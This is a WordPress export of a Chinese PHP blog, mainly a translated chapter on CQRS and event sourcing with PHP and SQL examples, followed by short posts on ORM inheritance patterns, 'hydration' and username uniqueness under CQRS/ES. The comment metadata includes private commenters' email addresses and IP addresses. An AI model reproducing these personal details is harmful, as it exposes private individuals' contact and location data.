    private $content;
    private $published = false;
    private $categories;
    private function __construct(PostId $id)
    {
        $this-&gt;id = $id;
        $this-&gt;categories = new Collection();
    }
    public static function writeNewFrom($title, $content)
    {
        $postId = PostId::create();
        $post = new static($postId);
        $post-&gt;recordApplyAndPublishThat(new PostWasCreated($postId, $title, $content));
    }
    public function publish()
    {
        $this-&gt;recordApplyAndPublishThat(new PostWasPublished($this-&gt;id));
    }
    public function categorizeIn(CategoryId $categoryId)
    {
        $this-&gt;recordApplyAndPublishThat(new PostWasCategorized($this-&gt;id, $categoryId));
    }
    public function changeContentFor($newContent)
    {
        $this-&gt;recordApplyAndPublishThat(new PostContentWasChanged($this-&gt;id, $newContent));
    }
    public function changeTitleFor($newTitle)
    {
        $this-&gt;recordApplyAndPublishThat(new PostTitleWasChanged($this-&gt;id, $newTitle));
    }
}</code></pre><p>所有触发状态改变的动作都是通过领域事件来实现的，对于每一个发布的领域事件，都有一个方法来反映出状态的改变。</p><pre><code class="lang-php">&lt;?php
class Post extends AggregateRoot
{
    // ...
    protected function applyPostWasCreated(PostWasCreated $event)
    {
        $this-&gt;id = $event-&gt;id();
        $this-&gt;title = $event-&gt;title();
        $this-&gt;content = $event-&gt;content();
    }
    protected function applyPostWasPublished(PostWasPublished $event)
    {
        $this-&gt;published = true;
    }
    protected function applyPostWasCategorized(PostWasCategorized $event)
    {
        $this-&gt;categories-&gt;add($event-&gt;categoryId());
    }
    protected function applyPostContentWasChanged(PostContentWasChanged $event)
    {
        $this-&gt;content = $event-&gt;content();
    }
    protected function applyPostTitleWasChanged(PostTitleWasChanged $event)
    {
        $this-&gt;title = $event-&gt;title();
    }
}</code></pre><h4>读模型</h4><p>读模型也被称为查询模型，是脱离领域的反规范化(<a href="https://searchdatabase.techtarget.com.cn/whatis/7-22567/">denormalized</a>)的数据模型。事实上，对于CQRS，所有的读取问题都被视为报告过程，一个基础设施问题。一般来说，当使用CQRS，读取模型需要满足UI界面的需求和视图混合的复杂度。在根据关系数据库定义读模型的情况下，最简单的方法是在数据库表和UI视图之间设置一对一的关系，其他写入的地方会发布领域事件，触发使用写入模型投影来更新数据表和UI视图。</p><pre><code class="lang-sql">-- 带有评论的单篇博文的视图的定义
-- Definition of a UI view of a single post with its comments
CREATE TABLE single_post_with_comments (
    id INTEGER NOT NULL,
    post_id INTEGER NOT NULL,
    post_title VARCHAR(100) NOT NULL,
    post_content TEXT NOT NULL,
    post_created_at DATETIME NOT NULL,
    comment_content TEXT NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
-- Set up some data
INSERT INTO single_post_with_comments VALUES
    (1, 1, &quot;Layered&quot; , &quot;Some content&quot;, NOW(), &quot;A comment&quot;),
    (2, 1, &quot;Layered&quot; , &quot;Some content&quot;, NOW(), &quot;The comment&quot;),
    (3, 2, &quot;Hexagonal&quot; , &quot;Some content&quot;, NOW(), &quot;No comment&quot;),
    (4, 2, &quot;Hexagonal&quot;, &quot;Some content&quot;, NOW(), &quot;All comments&quot;),
    (5, 3, &quot;CQRS&quot;, &quot;Some content&quot;, NOW(), &quot;This comment&quot;),
    (6, 3, &quot;CQRS&quot;, &quot;Some content&quot;, NOW(), &quot;That comment&quot;);
-- Query it
SELECT * FROM single_post_with_comments WHERE post_id = 1;</code></pre><p>这种结构风格的一个重要特征是，由于应用程序的状态被写模型处理了，所以使用读模型完全是一次性的。这意味着读模型能被需要时使用写模型投影来移除和重建。</p><p>在这里，我们可以博客程序中看到一些可能的视图示例：</p><pre><code class="lang-sql">SELECT * FROM
    posts_grouped_by_month_and_year
ORDER BY month DESC,year ASC;
SELECT * FROM
    posts_by_tags
WHERE tag = &quot;ddd&quot;;
SELECT * FROM
    posts_by_author
WHERE author_id = 1;</code></pre><p>需要重点指出的是，CQRS不会强制将读模型的定义与其实现限制为关系数据库。它完全取决于你程序的需求，可以是使用关系数据库、面向文档的数据库、key-value键值对数据库以及任何适合你程序的数据库。继续博客程序，我们将使用Elasticsearch（一个面向文档的数据库）来实现读模型。</p><pre><code class="lang-php">&lt;?php
class PostsController {
    public function listAction() {
        $client = new ElasticsearchClientBuilder::create()-&gt;build();
        $response = $client-&gt;search(['index' =&gt; 'blog-engine', 'type' =&gt; 'posts', 'body' =&gt; ['sort' =&gt; ['created_at' =&gt; ['order' =&gt; 'desc']]]]);
        return ['posts' =&gt; $response];
    }
}</code></pre><p>读模型的代码已经针对Elasticsearch单个索引彻底的简化了。</p><p>这表明了读模型不需要一个对象关系映射器(ORM)，但是，写模型可能会从对象关系映射器的使用中获得好处，因为这将允许你根据程序的需求来组织和构建读模型。</p><h4>同步写模型和读模型</h4><p>棘手的部分来了，我们怎么将读模型和写模型同步？我们已经说过，我们将使用获取的领域事件来完成同步。对于每一个获取的领域事件，一个特定的投影将被执行。所以领域事件和投影之间存在一对一的关系。</p><p>让我们看一个配置投影的例子，以便更好的理解。首先，我们需要为投影定义一个骨架：</p><pre><code class="lang-php">&lt;?php
interface Projection
{
    public function listensTo();
    public function project($event);
}</code></pre><p>因此为<code>PostWasCreated</code>事件定义一个Elasticsearch投影将像这样简单：</p><pre><code class="lang-php">&lt;?php
namespace InfrastructureProjectionElasticsearch;
use ElasticsearchClient;
use PostWasCreated;
class PostWasCreatedProjection implements Projection {
    private $client;
    public function __construct(Client $client) {
        $this-&gt;client = $client;
    }
    public function listensTo() {
        return PostWasCreated::class;
    }
    public function project($event) {
        $this-&gt;client-&gt;index(['index' =&gt; 'posts', 'type' =&gt; 'post', 'id' =&gt; $event-&gt;getPostId(), 'body' =&gt; ['content' =&gt; $event-&gt;getPostContent(),
        // ...
        ]]);
    }
}
</code></pre><p>投影器的实现是一种专门的领域事件监听器，它和默认的领域事件监听器的区别在于，投影器对一组领域事件作出反应，而不是只对一个领域事件作出反应。</p><pre><code class="lang-php">&lt;?php
namespace InfrastructureProjection;
class Projector {
    private $projections = [];
    public function register(array $projections) {
        foreach ($projections as $projection) {
            $this-&gt;projections[$projection-&gt;eventType() ] = $projection;
        }
    }
    public function project(array $events) {
        foreach ($events as $event) {
            if (isset($this-&gt;projections[get_class($event) ])) {
                $this-&gt;projections[get_class($event) ]-&gt;project($event);
            }
        }
    }
}</code></pre><p>以下代码展示了投影器和事件之间的流程：</p><pre><code class="lang-php">&lt;?php
$client = new ElasticsearchClientBuilder::create()-&gt;build();
$projector = new Projector();
$projector-&gt;register([new InfrastructureProjectionElasticsearchPostWasCreatedProjection($client), new InfrastructureProjectionElasticsearchPostWasPublishedProjection($client), new InfrastructureProjectionElasticsearchPostWasCategorizedProjection($client), new InfrastructureProjectionElasticsearchPostContentWasChangedProjection($client), new InfrastructureProjectionElasticsearchPostTitleWasChangedProjection($client), ]);
$events = [new PostWasCreated( /* ... */
), new PostWasPublished( /* ... */
), new PostWasCategorized( /* ... */
), new PostContentWasChanged( /* ... */
), new PostTitleWasChanged( /* ... */
), ];
$projector-&gt;project($event);</code></pre><p>这个代码是同步的，但是如果需要也可以成为异步。通过在视图层展示一些提示信息来让用户了解这些没有同步更新的数据。</p><p>对于下一个例子，我们将使结合ReactPHP来使用amqplib PHP扩展：</p><pre><code class="lang-php">&lt;?php
// Connect to an AMQP broker
$cnn = new AMQPConnection();
$cnn-&gt;connect();
// Create a channel
$ch = new AMQPChannel($cnn);
// Declare a new exchange
$ex = new AMQPExchange($ch);
$ex-&gt;setName('events');
$ex-&gt;declare();
// Create an event loop
$loop = ReactEventLoopFactory::create();
// Create a producer that will send any waiting messages every half a
second $producer = new GosComponentReactAMQPProducer($ex, $loop, 0.5);
$serializer = JMSSerializerSerializerBuilder::create()-&gt;build();
$projector = new AsyncProjector($producer, $serializer);
$events = [new PostWasCreated( /* ... */
), new PostWasPublished( /* ... */
), new PostWasCategorized( /* ... */
), new PostContentWasChanged( /* ... */
), new PostTitleWasChanged( /* ... */
), ];
$projector-&gt;project($event);</code></pre><p>为使该代码能运行，我们需要一个异步投影器。这有一个简单的实现：</p><pre><code class="lang-php">&lt;?php
// Connect to an AMQP broker
$cnn = new AMQPConnection();
$cnn-&gt;connect();
// Create a channel
$ch = new AMQPChannel($cnn);
// Declare a new exchange
$ex = new AMQPExchange($ch);
$ex-&gt;setName('events');
$ex-&gt;declare();
// Create an event loop
$loop = ReactEventLoopFactory::create();
// Create a producer that will send any waiting messages every half a
second $producer = new GosComponentReactAMQPProducer($ex, $loop, 0.5);
$serializer = JMSSerializerSerializerBuilder::create()-&gt;build();
$projector = new AsyncProjector($producer, $serializer);
$events = [new PostWasCreated( /* ... */
), new PostWasPublished( /* ... */
), new PostWasCategorized( /* ... */
), new PostContentWasChanged( /* ... */
), new PostTitleWasChanged( /* ... */
), ];
$projector-&gt;project($event);</code></pre><p>而RabbitMQ事件消费者的代码像这样：</p><pre><code class="lang-php">&lt;?php
// Connect to an AMQP broker
$cnn = new AMQPConnection();
$cnn-&gt;connect();
// Create a channel
$ch = new AMQPChannel($cnn);
// Create a new queue
$queue = new AMQPQueue($ch);
$queue-&gt;setName('events');
$queue-&gt;declare();
// Create an event loop
$loop = ReactEventLoopFactory::create();
$serializer = JMSSerializerSerializerBuilder::create()-&gt;build();
$client = new ElasticsearchClientBuilder::create()-&gt;build();
$projector = new Projector();
$projector-&gt;register([new InfrastructureProjectionElasticsearchPostWasCreatedProjection($client), new InfrastructureProjectionElasticsearchPostWasPublishedProjection($client), new InfrastructureProjectionElasticsearchPostWasCategorizedProjection($client), new InfrastructureProjectionElasticsearchPostContentWasChangedProjection($client), new InfrastructureProjectionElasticsearchPostTitleWasChangedProjection($client), ]);
// Create a consumer
$consumer = new GosComponentReactAMQPConsumer($queue, $loop, 0.5, 10);
// Check for messages every half a second and consume up to 10 at a time.
$consumer-&gt;on('consume', function ($envelope, $queue) use($projector, $serializer) {
    $event = $serializer-&gt;unserialize($envelope-&gt;getBody(), 'json');
    $projector-&gt;project($event);
});
$loop-&gt;run();</code></pre><p>从现在开始，所有需要的Repository消费一个投影器实例，并使得Repository调用投影过程：</p><pre><code class="lang-php">&lt;?php
class DoctrinePostRepository implements PostRepository {
    private $em;
    private $projector;
    public function __construct(EntityManager $em, Projector $projector) {
        $this-&gt;em = $em;
        $this-&gt;projector = $projector;
    }
    public function save(Post $post) {
        $this-&gt;em-&gt;transactional(function (EntityManager $em) use($post) {
            $em-&gt;persist($post);
            foreach ($post-&gt;recordedEvents() as $event) {
                $em-&gt;persist($event);
            }
        });
        $this-&gt;projector-&gt;project($post-&gt;recordedEvents());
    }
    public function byId(PostId $id) {
        return $this-&gt;em-&gt;find($id);
    }
}</code></pre><p>Post实例和记录的事件在同一个事务中被触发和持久化，这确保了不会有事件丢失，如果事务执行成功，我们将这些事件投影到读模型。因此，写模型和读模型之间不会不一致。</p><blockquote><p>使用ORM还是不使用ORM？<br />在实现CQRS时最常见的一个问题是：是否真的需要使用ORM？我们坚信在写模型中使用ORM是非常好的，并且具有使用工具的所有有点，这有助于我们使用关系数据库的情况下节省大量的工作。但是我们不应该忘记，我们仍然需要在关系数据库中持久化和检索写模型的状态。</p></blockquote><h2>事件溯源</h2><p>CQRS是一个强大而灵活的架构，在收集和保存领域事件（在聚合操作中发生的）方面有一个额外的好处，可以让你详细的了解领域中发生的事情。因为领域事件描述了过去所发生的事情，这在领域中是具有重要意义的，所以领域事件是战术模式的关键点之一，</p><blockquote><p>小心记录太多的事件<br />越来越多的事件意味着在领域中大量使用事件，这很可能是由业务来激发的。但作为一个经验法则，记住保持简单为好。</p></blockquote><p>通过使用CQRS，我们能够记录领域层中发生的所有相关事件。领域模型的状态可以通过之前记录的事件来重现。我们只要一个工具以一致的方式来存储这些事件，所以我们需要一个事件仓库。</p><blockquote><p>事件溯源背后的基本思想是，将聚合的状态表示为事件的顺序变化。</p></blockquote><p>使用CQRS，我们部分实现了以下功能：Post实体通过领域事件来更改其状态，由于之前已经解释过了，通过将对象映射到关系数据库的方式，Post实体已被持久化。</p><p>离事件溯源更近一步，如果我们使用一张数据表来存储所有博客文章的状态，另一张表存储所有文章的评论等。使用事件溯源让我们使用单个表：存储所有由聚合发布的领域事件，单一的做追加。是的，你没看错，一张数据表。</p><p>有了这样的模型，像ORM这样的工具不再需要了。唯一需要的工具是一个简单的数据库抽象层，通过它可以追加事件进去：</p><pre><code class="lang-php">&lt;?php
interface EventSourcedAggregateRoot {
    public static function reconstitute(EventStream $events);
}
class Post extends AggregateRoot implements EventSourcedAggregateRoot {
    public static function reconstitute(EventStream $history) {
        $post = new static ($history-&gt;getAggregateId());
        foreach ($events as $event) {
            $post-&gt;applyThat($event);
        }
        return $post;
    }
}</code></pre><p>现在Post聚合有一个方法，当给定一组事件时（换句话说，一个事件流），他能够在保存之前，一步一步的重现状态直到成为当前状态。下一步将构建PostRepository端口的适配器，该端口将从Post聚合提取所有发布的事件，并将它们追加到存储事件的表中，这就是我们所说的事件仓库：</p><pre><code class="lang-php">&lt;?php
class EventStorePostRepository implements PostRepository {
    private $eventStore;
    private $projector;
    public function __construct($eventStore, $projector) {
        $this-&gt;eventStore = $eventStore;
        $this-&gt;projector = $projector;
    }
    public function save(Post $post) {
        $events = $post-&gt;recordedEvents();
        $this-&gt;eventStore-&gt;append(new EventStream($post-&gt;id(), $events));
        $post-&gt;clearEvents();
        $this-&gt;projector-&gt;project($events);
    }
}</code></pre><p>这是当我们使用事件仓库来保存Post聚合发布的所有事件时的实现，现在我们需要一个方式去从事件历史中恢复一个聚合。由Post聚合实现的一个方法，来从事件中重建一个博客文章状态：</p><pre><code class="lang-php">&lt;?php
class EventStorePostRepository implements PostRepository {
    public function byId(PostId $id) {
        return Post::reconstitute($this-&gt;eventStore-&gt;getEventsFor($id));
    }
}</code></pre><p>事件仓库是负责保存和恢复事件流所有责任的主力。其公开API有两个简单的方法组成：它们是<code>append</code>和<code>getEventsFrom</code>，前者将事件流追加到事件仓库中，后者加载事件流来重建聚合。</p><p>我们可以使用键值对形式实现去存储所有事件：</p><pre><code class="lang-php">&lt;?php
class EventStore {
    private $redis;
    private $serializer;
    public function __construct($redis, $serializer) {
        $this-&gt;redis = $redis;
        $this-&gt;serializer = $serializer;
    }
    public function append(EventStream $eventstream) {
        foreach ($eventstream as $event) {
            $data = $this-&gt;serializer-&gt;serialize($event, 'json');
            $date = (new DateTimeImmutable())-&gt;format('YmdHis');
            $this-&gt;redis-&gt;rpush('events:' . $event-&gt;getAggregateId(), $this-&gt;serializer-&gt;serialize(['type' =&gt; get_class($event), 'created_on' =&gt; $date, 'data' =&gt; $data], 'json'));
        }
    }
    public function getEventsFor($id) {
        $serializedEvents = $this-&gt;redis-&gt;lrange('events:' . $id, 0, -1);
        $eventStream = [];
        foreach ($serializedEvents as $serializedEvent) {
            $eventData = $this-&gt;serializerdeserialize($serializedEvent, 'array', 'json');
            $eventStream[] = $this-&gt;serializer-&gt;deserialize($eventData['data'], $eventData['type'], 'json');
        }
        return new EventStream($id, $eventStream);
    }
}
</code></pre><p>这个事件仓库的实现是基于Redis的，使用前缀将事件追加到列表中：另外，在持久化事件之前，我们提取一些元数据，像事件类名或创建日期等，因为稍后会派上用场。</p><p>显然，就性能而言，聚合总是要经历一遍事件历史才能达到最终的状态，这代价是非常昂贵的。事件流如果包含数百甚至上千事件更是如此。处理这种情况的最佳方法是从聚合中获取快照，并且仅重现快照之后发生的事件流中的事件。快照只是在任何特定时刻聚合状态的简单序列化形式，它可以基于聚合事件流的事件数量，也可以基于时间。采用第一种方法，每触发n个事件（如每隔50、100或200个事件）就会记录一张快照，第二种方法是每隔n秒记录一次快照。</p><p>我们将使用第一种记录快照的方式，在事件的元数据中，我们存储了一个额外的字段——version，该字段表示我们开始重现聚合历史的开始位置。</p><pre><code class="lang-php">&lt;?php
class SnapshotRepository {
    public function byId($id) {
        $key = 'snapshots:' . $id;
        $metadata = $this-&gt;serializer-&gt;unserialize($this-&gt;redis-&gt;get($key));
        if (null === $metadata) {
            return;
        }
        return new Snapshot($metadata['version'], $this-&gt;serializer-&gt;unserialize($metadata['snapshot']['data'], $metadata['snapshot']['type'], 'json'));
    }
    public function save($id, Snapshot $snapshot) {
        $key = 'snapshots:' . $id;
        $aggregate = $snapshot-&gt;aggregate();
        $snapshot = ['version' =&gt; $snapshot-&gt;version(), 'snapshot' =&gt; ['type' =&gt; get_class($aggregate), 'data' =&gt; $this-&gt;serializer-&gt;serialize($aggregate, 'json') ]];
        $this-&gt;redis-&gt;set($key, $snapshot);
    }
}</code></pre><p>现在我们需要重构EventStore类，以便开始使用SnapshotRepository类在可接受的性能时间内去加载聚合。</p><pre><code class="lang-php">&lt;?php
class EventStorePostRepository implements PostRepository {
    public function byId(PostId $id) {
        $snapshot = $this-&gt;snapshotRepository-&gt;byId($id);
        if (null === $snapshot) {
            return Post::reconstitute($this-&gt;eventStore-&gt;getEventsFrom($id));
        }
        $post = $snapshot-&gt;aggregate();
        $post-&gt;replay($this-&gt;eventStore-&gt;fromVersion($id, $snapshot-&gt;version()));
        return $post;
    }
}
</code></pre><p>我们只需要定期进行记录聚合的快照，我们可以通过负责异步或同步监听事件仓库的进程来执行快照的记录。以下是一个演示聚合快照实施的简单示例：</p><pre><code class="lang-php">&lt;?php
class EventStorePostRepository implements PostRepository {
    public function save(Post $post) {
        $id = $post-&gt;id();
        $events = $post-&gt;recordedEvents();
        $post-&gt;clearEvents();
        $this-&gt;eventStore-&gt;append(new EventStream($id, $events));
        $countOfEvents = $this-&gt;eventStore-&gt;countEventsFor($id);
        $version = $countOfEvents / 100;
        if (!$this-&gt;snapshotRepository-&gt;has($post-&gt;id(), $version)) {
            $this-&gt;snapshotRepository-&gt;save($id, new Snapshot($post, $version));
        }
        $this-&gt;projector-&gt;project($events);
    }
}</code></pre><blockquote><p>使用ORM还是不使用ORM？<br />从这种架构风格的用例我们可以清楚的看到，使用ORM来持久和获取事件会过度设计。即使我们使用关系数据库来存储事件，我们也只需从数据库中持久化和获取事件。</p></blockquote><h2>总结</h2><p>由于可选的架构风格有很多，因此你可能会对于本章节的内容感到困惑。你需要在众多选择中去权衡优缺点，来做出正确的选择。有一点很清楚：大泥球的方式不应该选择，因为代码会很快烂掉。分层架构是一个更好的选择，但是它也存在一些缺点，如各层之间的紧耦合。可以说，最均衡的选择是六边形架构，因为它可以用作基础架构，并且可以促进程序内部和外部高度解耦和对称性。这是我们为大多数场景下推荐的选择。</p><p>我们也看到CQRS和事件溯源是相对灵活的架构，可以帮助你应对复杂性。CQRS和事件溯源都有自己的定位，但也不要让这个因素来分散你的注意你。因为它们都有一些开销，你应该有一个来使用它们的技术理由。这些架构确实非常有用，可以在CQRS的Repository仓储的finder方法的数量上和事件溯源触发的事件数量上得到启发。如果finder方法开始增加，并且仓储变得难以维护，那么是时候考虑CQRS，以便拆分读写问题。如果每个聚合的事件数量趋于增长，并且业务对更细粒度的信息关注，那么可以考虑的一个选择是事件溯源。</p><p>从Brian Foote和Joseph Yoder论文中提取的：大泥球（BIG BALL OF MUD）是一个杂乱的结构、蔓延无序的、胶带似的、下水管道似的、意大利面条似的代码丛林。（译者注：只可意会）</p>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>553</wp:post_id>
		<wp:post_date><![CDATA[2018-04-19 13:27:00]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2018-04-19 13:27:00]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[553]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="ddd"><![CDATA[ddd]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="%e9%a2%86%e5%9f%9f%e9%a9%b1%e5%8a%a8%e8%ae%be%e8%ae%a1"><![CDATA[领域驱动设计]]></category>
						<wp:comment>
			<wp:comment_id>23</wp:comment_id>
			<wp:comment_author><![CDATA[冲新出发]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[18612314865@163.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[36.98.24.192]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2018-07-03 14:03:48]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2018-07-03 14:03:48]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[希望作者继续翻译下去，顺便问一下作者你认识东杰吗]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[comment]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>24</wp:comment_id>
			<wp:comment_author><![CDATA[Veitor]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[dandankele@vip.qq.com]]></wp:comment_author_email>
			<wp:comment_author_url>http://www.veitor.net</wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[61.160.251.57]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2018-07-04 09:44:10]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2018-07-04 09:44:10]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[不认识额]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[comment]]></wp:comment_type>
			<wp:comment_parent>23</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>25</wp:comment_id>
			<wp:comment_author><![CDATA[冲新出发]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[18612314865@163.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[36.98.142.206]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2018-07-04 13:32:24]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2018-07-04 13:32:24]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[宋永柱，和冯建章呢]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[comment]]></wp:comment_type>
			<wp:comment_parent>24</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
							</wp:comment>
					</item>
					<item>
		<title>类表继承（Class Table Inheritance）</title>
		<link>http://wp.veitor.net/2018/08/03/571/</link>
		<pubDate>Fri, 03 Aug 2018 00:52:44 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=571</guid>
		<description></description>
		<content:encoded><![CDATA[<p>&lt;!--markdown--&gt;<em>表示类的继承层次结构，每个类都对应一张数据表</em><br /><img src="http://storage.veitor.net/2018/08/2165706583.gif" alt="classInheritanceTableSketch.gif" title="classInheritanceTableSketch.gif"></p><p>对象关系阻抗不匹配的一个显著方面是由于关系数据库不支持继承。你想要数据库结构能够清晰的映射到对象，并想要在继承结构中可以任意链接。<code>类表继承</code>通过使用一个数据表对应一个类的方式来实现这样的目的。</p>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>571</wp:post_id>
		<wp:post_date><![CDATA[2018-08-03 00:52:44]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2018-08-03 00:52:44]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[571]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="php"><![CDATA[PHP]]></category>
						</item>
					<item>
		<title>单表继承（Single Table Inheritance）</title>
		<link>http://wp.veitor.net/2018/08/03/573/</link>
		<pubDate>Fri, 03 Aug 2018 01:01:35 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=573</guid>
		<description></description>
		<content:encoded><![CDATA[<p>&lt;!--markdown--&gt;<em>将类的继承层次表示为单张数据表，这张表内含有每个类的所有字段</em></p><p><img src="http://storage.veitor.net/2018/08/2552666952.gif" alt="classInheritanceTableSketch.gif" title="classInheritanceTableSketch.gif"></p><p>关系数据库不支持继承，当对象映射到数据库时，我们必须考虑如何在关系数据表中良好的展示我们的对象继承结构。当对象映射到关系数据库时，在多张表中处理继承结构过程中，我们尝试着去尽量减少迅速增加的join查询。（参考<a href="http://www.veitor.net/article/571.html">类表查询</a>）。<code>单表继承</code>将所有类的继承结构的所有字段映射到了一张表中。</p>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>573</wp:post_id>
		<wp:post_date><![CDATA[2018-08-03 01:01:35]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2018-08-03 01:01:35]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[573]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="php"><![CDATA[PHP]]></category>
						</item>
					<item>
		<title>编程中的hydration是什么意思</title>
		<link>http://wp.veitor.net/2018/08/16/576/</link>
		<pubDate>Thu, 16 Aug 2018 05:53:31 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=576</guid>
		<description></description>
		<content:encoded><![CDATA[<p>&lt;!--markdown--&gt;经常能看到在一些书本和文章中写到<code>hydration</code>，这一单词单独去翻译为“水合”、“水合作用”等，但放在文章中又似乎读不同，难以理解。</p><p>通过查阅了更多的信息之后，<code>hydration</code>的大致意思基本了解了。</p><p>可以理解为对象提供水分，为什么对象呢？就是刚实例化的对象。并且我们最常见提到“水合”的地方就是刚从数据库或其他存储介质中取出数据填充到对象上。</p><p>那么这种一个已经在内存中实例化的对象，还没有包含任何数据，然后用数据（例如从数据库、网络、文件系统等获取的）填充到该对象内，这种行为成为<code>hydration</code>水合。</p><p>常见的一种水合方式就是序列化和反序列化了，如在PHP中对对象进行<code>serialize</code>和<code>unserialize</code>，此时的<code>反序列化==实例化+水合</code>。</p>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>576</wp:post_id>
		<wp:post_date><![CDATA[2018-08-16 05:53:31]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2018-08-16 05:53:31]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[576]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="php"><![CDATA[PHP]]></category>
						</item>
					<item>
		<title>CQRS/ES架构下如何保证用户名的唯一性？</title>
		<link>http://wp.veitor.net/2018/12/04/577/</link>
		<pubDate>Tue, 04 Dec 2018 08:11:00 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=577</guid>
		<description></description>
		<content:encoded><![CDATA[<p>&lt;!--markdown--&gt;CQRS/ES下，许多开发者不了解如何在系统中处理这样的场景：</p><blockquote><p>在用户创建的时候，我们想要去验证用户名在数据库中是否是唯一的。我应该使用<code>Event Store</code>还是使用<code>读数据库</code>查询？我该在哪执行这个查询？</p></blockquote><p>这个问题是StackOverflow上与CQRS话题有关的最受关注的话题。因此在这篇文章中，我们将尝试针对这个问题寻找出最佳解决方案。</p><!--more--><h1>方案1：在Command Handler中使用Event Store来验证</h1><p>我们假设在Command Handler中使用Event Store来对用户名进行验证。但是我们会有个问题，这样做会很低效，让我们来看一下为什么。想象一下你的聚合对象包含了100个事件，并且我们有将近5000个注册用户。每重构一遍这个聚合都需要先获取100个事件，则我们将获得100*5000 = 500000个事件，毫无疑问这个方案行不通。</p><h1>方案2：在Command Handler中使用读数据库来验证</h1><p>由于上述讨论Event Store不适合来做这项验证工作，那么我们使用<code>读数据库</code>在Command Handler中来验证。这样的验证查询非常简单：</p><pre><code class="lang-sql">select * from user where username = :username;</code></pre><p>这看起来是一个好的办法，但还是有两点问题。首先，我们不应该在Command中使用Query，这违背了CQRS原则。其次，这方法不一定每次都能奏效，因为我们还需要处理两种数据库(<code>ES</code>和<code>读数据库</code>)之间的最终一致性问题。看一下下面的场景会发生什么问题：</p><p><img src="http://storage.veitor.net/2018/12/2253085505.png" alt="cqrs-diagram-1024x292.png" title="cqrs-diagram-1024x292.png"></p><p>假设有人创建了用户名为<code>TestUser</code>的帐号。他的command已经被发送到了command 